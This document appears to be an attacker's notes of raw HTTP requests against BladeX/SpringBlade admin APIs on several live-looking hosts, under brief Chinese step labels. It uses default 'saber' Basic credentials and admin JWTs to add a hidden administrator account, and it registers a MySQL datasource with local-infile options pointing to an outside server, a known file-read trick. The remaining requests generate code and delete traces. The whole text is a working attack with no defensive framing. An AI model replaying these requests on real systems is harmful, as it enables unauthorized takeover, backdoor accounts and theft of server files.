加用户
```
POST /api/blade-user/submit HTTP/1.1
Host: 110.185.174.7:10009
Connection: keep-alive
sec-ch-ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
sec-ch-ua-platform: "Windows"
Captcha-Code: 76842
sec-ch-ua-mobile: ?0
Blade-Auth: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJ1c2VyX25hbWUiOiJhZG1pbiIsInJlYWxfbmFtZSI6IueuoeeQhuWRmOWTiCIsImF1dGhvcml0aWVzIjpbImFkbWluaXN0cmF0b3IiXSwiY2xpZW50X2lkIjoic2FiZXIiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwibGljZW5zZSI6InBvd2VyZWQgYnkgYmxhZGV4IiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwic2NvcGUiOlsiYWxsIl0sIm5pY2tfbmFtZSI6IueuoeeQhuWRmCIsIm9hdXRoX2lkIjoiIiwiZGV0YWlsIjp7InR5cGUiOiJ3ZWIifSwiYWNjb3VudCI6ImFkbWluIn0.ArRFp3O8tlfnjXvQWEbBzSFTo6U58w8uadSOqkv8sa0
Authorization: Basic c2FiZXI6c2FiZXJfc2VjcmV0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Tenant-Id: 000000
Captcha-Key: 4503c657-cca3-443a-ae20-6134599ff93f
Role-Id:
Dept-Id:
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json
Content-Length: 124

{
"account": "admin123456",
"name": "GuestUser",
"password": "123456by",
"tenantId": "000000",
      "roleId": "1123598816738675201,1448552905606103042",
      "deptId": "51190200018",
      "postId": "1417026080577097730"
}
```

添加数据源
```
POST /api/blade-develop/datasource/submit HTTP/1.1
Host: 47.95.28.7:83
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Authorization: Basic c2FiZXI6c2FiZXJfc2VjcmV0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0
Content-Type: application/json;charset=UTF-8
Accept: application/json, text/plain, */*
Referer: http://39.10:8886/
Blade-Auth: bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwidXNlcl9uYW1lIjoiYWRtaW4iLCJuaWNrX25hbWUiOiLnrqHnkIblkZgiLCJkZXRhaWwiOnsidHlwZSI6IndlYiJ9LCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MTM3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzYWJlciIsImV4cCI6MTcyNTY0NTAyNywibmJmIjoxNzI1NjQxNDI3fQ.k_UihX-KDlfh0QNgbNW17Qx4zucz_n1xLr-AiCC_juMuiu0G0Ss5_rhDpyQbIqS3vANVrYasiFqM0YkS-cwKVQ
Origin: http://39.40:8886
Accept-Encoding: gzip, deflate
Cookie: saber-access-token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwidXNlcl9uYW1lIjoiYWRtaW4iLCJuaWNrX25hbWUiOiLnrqHnkIblkZgiLCJkZXRhaWwiOnsidHlwZSI6IndlYiJ9LCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MTM3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzYWJlciIsImV4cCI6MTcyNTY0NTAyNywibmJmIjoxNzI1NjQxNDI3fQ.k_UihX-KDlfh0QNgbNW17Qx4zucz_n1xLr-AiCC_juMuiu0G0Ss5_rhDpyQbIqS3vANVrYasiFqM0YkS-cwKVQ; saber-refresh-token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwidG9rZW5fdHlwZSI6InJlZnJlc2hfdG9rZW4iLCJkZXB0X2lkIjoiMTEyMzU5ODgxMzczODY3NTIwMSIsImNsaWVudF9pZCI6InNhYmVyIiwiZXhwIjoxNzI2MjQ2MjI3LCJuYmYiOjE3MjU2NDE0Mjd9.O4H_6n2W1biMDB5pdMOaz1Smk-iPbhYQzEt4wW-e5QrSic55fBx0-12US2zQ2ifNVK8EQhuWbSyFOQyBS9UJVg
Content-Length: 215

{"$driverClass":"","name":"11","driverClass":"com.mysql.cj.jdbc.Driver","username":"11","password":"11","url":"jdbc:mysql://47.109.58.25:3306/test?allowLoadLocalInfile=true&allowUrlInLocalInfile=true#","remark":""}
```
获取数据源
```
GET /api/blade-develop/datasource/list?current=1&size=10 HTTP/1.1
Host: 7.5.28.7:83
Accept: application/json, text/plain, */*
Authorization: Basic c2FiZXI6c2FiZXJfc2VjcmV0
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0
Referer: http://39.16240:8886/
Accept-Encoding: gzip, deflate
Blade-Auth: bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwidXNlcl9uYW1lIjoiYWRtaW4iLCJuaWNrX25hbWUiOiLnrqHnkIblkZgiLCJkZXRhaWwiOnsidHlwZSI6IndlYiJ9LCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MTM3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzYWJlciIsImV4cCI6MTcyNTY0NTAyNywibmJmIjoxNzI1NjQxNDI3fQ.k_UihX-KDlfh0QNgbNW17Qx4zucz_n1xLr-AiCC_juMuiu0G0Ss5_rhDpyQbIqS3vANVrYasiFqM0YkS-cwKVQ

```
删除某个数据源
```
POST /api/blade-develop/datasource/remove?ids=4 HTTP/1.1
Host: 7.95.28.7:83
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Accept: application/json, text/plain, */*
Origin: http://39.16440:8886
Referer: http://39.1640:8886/
Blade-Auth: bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwidXNlcl9uYW1lIjoiYWRtaW4iLCJuaWNrX25hbWUiOiLnrqHnkIblkZgiLCJkZXRhaWwiOnsidHlwZSI6IndlYiJ9LCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MTM3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzYWJlciIsImV4cCI6MTcyNTY0NTAyNywibmJmIjoxNzI1NjQxNDI3fQ.k_UihX-KDlfh0QNgbNW17Qx4zucz_n1xLr-AiCC_juMuiu0G0Ss5_rhDpyQbIqS3vANVrYasiFqM0YkS-cwKVQ
Authorization: Basic c2FiZXI6c2FiZXJfc2VjcmV0
Accept-Encoding: gzip, deflate
Cookie: saber-access-token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwidXNlcl9uYW1lIjoiYWRtaW4iLCJuaWNrX25hbWUiOiLnrqHnkIblkZgiLCJkZXRhaWwiOnsidHlwZSI6IndlYiJ9LCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MTM3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzYWJlciIsImV4cCI6MTcyNTY0NTAyNywibmJmIjoxNzI1NjQxNDI3fQ.k_UihX-KDlfh0QNgbNW17Qx4zucz_n1xLr-AiCC_juMuiu0G0Ss5_rhDpyQbIqS3vANVrYasiFqM0YkS-cwKVQ; saber-refresh-token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwidG9rZW5fdHlwZSI6InJlZnJlc2hfdG9rZW4iLCJkZXB0X2lkIjoiMTEyMzU5ODgxMzczODY3NTIwMSIsImNsaWVudF9pZCI6InNhYmVyIiwiZXhwIjoxNzI2MjQ2MjI3LCJuYmYiOjE3MjU2NDE0Mjd9.O4H_6n2W1biMDB5pdMOaz1Smk-iPbhYQzEt4wW-e5QrSic55fBx0-12US2zQ2ifNVK8EQhuWbSyFOQyBS9UJVg
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0
Content-Length: 0


```
根据数据源加代码
```
POST /api/blade-develop/code/submit HTTP/1.1
Host: 39.164..40:8886
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0
Content-Type: application/json;charset=UTF-8
Accept: application/json, text/plain, */*
Blade-Auth: bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yLHN0b3JlIiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxLDE2NjUyMjUxODkwOTYwNzExNjkiLCJ1c2VyX25hbWUiOiJhZG1pbiIsIm5pY2tfbmFtZSI6IueuoeeQhuWRmCIsImRldGFpbCI6eyJ0eXBlIjoid2ViIn0sInRva2VuX3R5cGUiOiJhY2Nlc3NfdG9rZW4iLCJkZXB0X2lkIjoiMTEyMzU5ODgxMzczODY3NTIwMSIsImFjY291bnQiOiJhZG1pbiIsImNsaWVudF9pZCI6InNhYmVyIiwiZXhwIjoxNzI1NjQ2MDU4LCJuYmYiOjE3MjU2NDI0NTh9.AFvD4E1QHaMUM5qfAa67OuCnqhLOjzX6PuySku8iyE0XMcPUTJVfVwoYHlMp1dUPOqD4XLpNTDKXUuLsYqWhmA
Accept-Encoding: gzip, deflate
Authorization: Basic c2FiZXI6c2FiZXJfc2VjcmV0
Content-Length: 258

{"$datasourceId":"1","$baseMode":"否","$wrapMode":"否","datasourceId":"1832104972938944513","codeName":"11","serviceName":"111","tableName":"111","tablePrefix":"11","pkName":"11","packageName":"11","baseMode":1,"wrapMode":1,"apiPath":"111","webPath":"111"}
```
看代码
```
GET /api/blade-develop/code/list?size=10 HTTP/1.1
Host: 39.16.229.40:888
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Referer: http://admin.si.cn/
Blade-Auth: bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yLHN0b3JlIiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxLDE2NjUyMjUxODkwOTYwNzExNjkiLCJ1c2VyX25hbWUiOiJhZG1pbiIsIm5pY2tfbmFtZSI6IueuoeeQhuWRmCIsImRldGFpbCI6eyJ0eXBlIjoid2ViIn0sInRva2VuX3R5cGUiOiJhY2Nlc3NfdG9rZW4iLCJkZXB0X2lkIjoiMTEyMzU5ODgxMzczODY3NTIwMSIsImFjY291bnQiOiJhZG1pbiIsImNsaWVudF9pZCI6InNhYmVyIiwiZXhwIjoxNzI1NjQ2MDU4LCJuYmYiOjE3MjU2NDI0NTh9.AFvD4E1QHaMUM5qfAa67OuCnqhLOjzX6PuySku8iyE0XMcPUTJVfVwoYHlMp1dUPOqD4XLpNTDKXUuLsYqWhmA
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate
Origin: http://admin.si.cn
Authorization: Basic c2FiZXI6c2FiZXJfc2VjcmV0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0


```
生成代码
```
POST /api/blade-develop/code/gen-code?ids=1832105203277537281&system=saber HTTP/1.1
Host: 39.164.29.20:8886
Origin: http://admin.si.cn
Referer: http://admin.si.cn/
Accept-Encoding: gzip, deflate
Blade-Auth: bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yLHN0b3JlIiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxLDE2NjUyMjUxODkwOTYwNzExNjkiLCJ1c2VyX25hbWUiOiJhZG1pbiIsIm5pY2tfbmFtZSI6IueuoeeQhuWRmCIsImRldGFpbCI6eyJ0eXBlIjoid2ViIn0sInRva2VuX3R5cGUiOiJhY2Nlc3NfdG9rZW4iLCJkZXB0X2lkIjoiMTEyMzU5ODgxMzczODY3NTIwMSIsImFjY291bnQiOiJhZG1pbiIsImNsaWVudF9pZCI6InNhYmVyIiwiZXhwIjoxNzI1NjQ2MDU4LCJuYmYiOjE3MjU2NDI0NTh9.AFvD4E1QHaMUM5qfAa67OuCnqhLOjzX6PuySku8iyE0XMcPUTJVfVwoYHlMp1dUPOqD4XLpNTDKXUuLsYqWhmA
Authorization: Basic c2FiZXI6c2FiZXJfc2VjcmV0
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0
Accept: application/json, text/plain, */*
Content-Length: 0


```
删除代码
```
POST /api/blade-develop/code/remove?ids=1832103733287231489 HTTP/1.1
Host: admin.yuapp.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Blade-Auth: bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yLHN0b3JlIiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxLDE2NjUyMjUxODkwOTYwNzExNjkiLCJ1c2VyX25hbWUiOiJhZG1pbiIsIm5pY2tfbmFtZSI6IueuoeeQhuWRmCIsImRldGFpbCI6eyJ0eXBlIjoid2ViIn0sInRva2VuX3R5cGUiOiJhY2Nlc3NfdG9rZW4iLCJkZXB0X2lkIjoiMTEyMzU5ODgxMzczODY3NTIwMSIsImFjY291bnQiOiJhZG1pbiIsImNsaWVudF9pZCI6InNhYmVyIiwiZXhwIjoxNzI1NjQ2MDU4LCJuYmYiOjE3MjU2NDI0NTh9.AFvD4E1QHaMUM5qfAa67OuCnqhLOjzX6PuySku8iyE0XMcPUTJVfVwoYHlMp1dUPOqD4XLpNTDKXUuLsYqWhmA
Authorization: Basic c2FiZXI6c2FiZXJfc2VjcmV0
Referer: http://admin.si.cn/
Origin: http://admin.si.cn
Accept-Encoding: gzip, deflate
Content-Length: 0


```
删除数据源
```
POST /api/blade-develop/datasource/remove?ids=1832103630187044866 HTTP/1.1
Host: admin.yapp.com
Authorization: Basic c2FiZXI6c2FiZXJfc2VjcmV0
Accept: application/json, text/plain, */*
Blade-Auth: bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yLHN0b3JlIiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxLDE2NjUyMjUxODkwOTYwNzExNjkiLCJ1c2VyX25hbWUiOiJhZG1pbiIsIm5pY2tfbmFtZSI6IueuoeeQhuWRmCIsImRldGFpbCI6eyJ0eXBlIjoid2ViIn0sInRva2VuX3R5cGUiOiJhY2Nlc3NfdG9rZW4iLCJkZXB0X2lkIjoiMTEyMzU5ODgxMzczODY3NTIwMSIsImFjY291bnQiOiJhZG1pbiIsImNsaWVudF9pZCI6InNhYmVyIiwiZXhwIjoxNzI1NjQ2MDU4LCJuYmYiOjE3MjU2NDI0NTh9.AFvD4E1QHaMUM5qfAa67OuCnqhLOjzX6PuySku8iyE0XMcPUTJVfVwoYHlMp1dUPOqD4XLpNTDKXUuLsYqWhmA
Referer: http://admin.scfsi.cn/
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0
Origin: http://admin.sci.cn
Accept-Encoding: gzip, deflate
Content-Length: 0

```